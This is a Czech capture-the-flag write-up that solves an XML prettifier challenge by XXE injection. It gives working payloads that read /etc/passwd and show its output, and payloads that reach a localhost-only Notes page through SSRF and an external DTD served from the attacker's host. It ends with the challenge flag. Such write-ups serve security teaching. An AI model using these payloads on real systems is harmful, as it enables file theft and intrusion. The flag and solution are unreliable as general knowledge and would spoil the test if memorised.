# XML Prettifier (1)

## Zadání

Hi, packet inspector,

some former employe of Mysterious Delivery Ltd. has created prettifier for XML code. It is polite to provide information to the AI in nicely formatted XML, isn't it? Rumors say that the employee also left some crucial information somewhere on the web.

Find the crucial information on webpage <http://prettifier.mysterious-delivery.tcc:50000> .

May the Packet be with you!

## Nápovědy (Hints)

1\. Use VPN to get access to the server.

## Řešení

Na zobrazené stránce ze zadání je v menu položka `Notes`, která ale nejde zobrazit s chybou

```text
Forbidden

IP filter is active, content is accessible only from localhost.
```

Dále je tam odkaz <http://prettifier.mysterious-delivery.tcc:50000/prettier> na formátovač XML kódu.

Zkusíme, jestli funguje a zadáme `<a><b>c</b></a>`. Výsledkem je

```xml
<a>
  <b>c</b>
</a>
```

Pokud zadáme nevalidní XML, například `<a>`, je zobrazena chyba

`<string>:1:4:FATAL:PARSER:ERR_TAG_NOT_FINISHED: Premature end of data in tag a line 1`

Útok tedy bude směřovat přes `XML External Entity (XXE) Injection Payload List`, viz např zde <https://github.com/payloadbox/xxe-injection-payload-list>.

---
Zkusíme

```xml
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
 ```

 a dostaneme

```xml
<userInfo>
  <firstName>John</firstName>
  <lastName>Doe</lastName>
</userInfo>
```

Jsme tedy na správné cestě.

---
Zkusíme načíst seznam uživatelů z `/etc/passwd`

```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

a dostaneme

```xml
<userInfo>
  <firstName>John</firstName>
  <lastName>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</lastName>
</userInfo>
```

Načítání souborů tedy funguje. Na úvodní stránce je odkaz v menu `Notes`, který je přístupný jen z lokálního počítače. Měl by tedy být čitelný přímo serverem.

---
Zkusíme ho načíst pomocí XML

```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "http://127.0.0.1:50000/notes"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

Server však vrátí chybu

```text
http://127.0.0.1:50000/notes:3:2:FATAL:PARSER:ERR_NAME_REQUIRED: StartTag: invalid element name http://127.0.0.1:50000/notes:13:8:FATAL:PARSER:ERR_TAG_NAME_MISMATCH: Opening and ending tag mismatch: link line 12 and head http://127.0.0.1:50000/notes:45:8:FATAL:PARSER:ERR_TAG_NAME_MISMATCH: Opening and ending tag mismatch: link line 9 and html http://127.0.0.1:50000/notes:45:8:FATAL:PARSER:ERR_TAG_NOT_FINISHED: Premature end of data in tag meta line 8 <string>:4:17:FATAL:PARSER:ERR_UNDECLARED_ENTITY: Entity 'ent' failed to parse 
```

Zpracování probíhá tak, že se nejdříve načte obsah stránky do XML a pak se spustí jeho formátování, které však selže.

Zkusíme vložit obsah stránky `Notes` přímo do `<!DOCTYPE`

```xml
<!DOCTYPE foo [
  <!ENTITY % notes SYSTEM "http://127.0.0.1:50000/notes">
  <!ENTITY % notes2 "<!ENTITY &#x25; test SYSTEM '%notes;'>">
]>
<a>
</a>
```

To však skončí s chybou

```text
<string>:3:61:FATAL:PARSER:ERR_ENTITY_PE_INTERNAL: PEReferences forbidden in internal subset 
```

Je potřeba tedy část načíst externě pomocí spuštění WEB serveru na mojí IP VPN adrese, ze které si XML Prettifier stáhne soubor, který zpracuje.

---
XML do prettifieru

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://10.200.0.10:8000/notes.xml">
  %xxe;
]>
```

Soubor `notes.xml` hostovaný na VPN klientovi

```xml
<!ENTITY % notes SYSTEM "http://127.0.0.1:50000/notes">
<!-- xxxxxxxxxxxxxxxxxxxxxxxx -->
<!ENTITY % notes2 "<!ENTITY &#x25; test SYSTEM '%notes;'>">
%notes2;
```

Ta XML poznámka tam musí být kvůli nějakému cachování XML parseru. V chybovém výpisu už je přítomen obsah stránky `Notes`, která obsahuje hledaný flag.

## Flag

`FLAG{GG53-5U3w-VT8F-qB31}`
